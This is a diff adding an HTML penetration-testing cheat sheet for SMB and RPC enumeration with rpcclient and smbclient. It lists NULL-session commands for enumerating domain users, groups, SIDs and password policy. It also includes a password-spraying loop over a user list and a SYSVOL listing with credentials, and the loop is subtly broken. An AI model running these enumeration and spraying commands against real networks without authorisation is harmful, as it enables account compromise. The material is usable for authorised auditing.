@@ -1,0 +1,41 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>SMB / rpcclient / smbclient</title>
+</head><body>$ rpcclient -U &lt;username&gt; &lt;WinIPaddr&gt;			Linux: connect to share<br/>
+$ rpcclient -U &quot;&quot; -N &lt;IP&gt;						Linux: connect via anonymous/NULL<br/>
+<br/>
+rpcclient $&gt; srvinfo							Get hostname information. Refer to <a href="http://en.wikipedia.org/wiki/Comparison_of_Microsoft_Windows_versions">here</a>.<br/>
+rpcclient $&gt; enumdomusers						Get usernames and RIDs<br/>
+rpcclient $&gt; enumalsgroups domain				Enumerate domain groups<br/>
+rpcclient $&gt; enumalsgroups builtin				Enumerate builtin groups<br/>
+rpcclient $&gt; queryuser &lt;RID&gt;					Query detailed user information based on RID<br/>
+Note here that the output shows the last logon time for the user, as well as the Password last set Time. That kind of stuff is immensely valuable for auditors and penetration testers alike.<br/>
+rpcclient $&gt; querygroup &lt;RID&gt;					Query groups based on RID<br/>
+If querygroup doesn't work, try queryaliasmem<br/>
+rpcclient $&gt; queryaliasmem &lt;groupName&gt; &lt;RID&gt;	Query groups, get user SIDs<br/>
+rpcclient $&gt; querygroupmem &lt;RID&gt;				Query users' group membership<br/>
+<br/>
+rpcclient $&gt; getdompwinfo						Query for password complexity settings<br/>
+rpcclient $&gt; getusrdompwinfo 0x44f (rid)			Query users password properties<br/>
+<br/>
+Other commands<br/>
+enumalsgroups enumdomains  enumdrivers  enumkey   enumprivs<br/>
+enumdata    enumdomgroups enumforms   enumports  enumtrust<br/>
+enumdataex   enumdomusers  enumjobs    enumprinter<br/>
+<br/>
+rpcclient $&gt; lsaenumsid						Query for all SID numbers<br/>
+rpcclient $&gt; lookupsids &lt;SID&gt;					Reverse query SIDS for account names<br/>
+NT_STATUS_NONE_MAPPED is returned if no account is linked to the queried SID<br/>
+rpcclient $&gt; lookupnames &lt;username&gt;			Query username for SID<br/>
+<br/>
+Script for password spray over rpcclient<br/>
+# for u in 'cat domain-users.txt'; do \ <br/>
+  echo -n &quot;[*] user: $u&quot; &amp;&amp; \ <br/>
+  rpcclient -U &quot;$u%&lt;PASSWORD&gt;&quot; \<br/>
+    -c &quot;getusername;quit&quot; &lt;IP&gt; \<br/>
+done<br/>
+<br/>
+Use smbclient and creds to gather SYSVOL information<br/>
+$ smbclient -U &quot;&lt;username&gt;%&lt;password&gt;&quot; \\\\domain.corp\\SYSVOL<br/>
+smb: \&gt; ls</body></html>
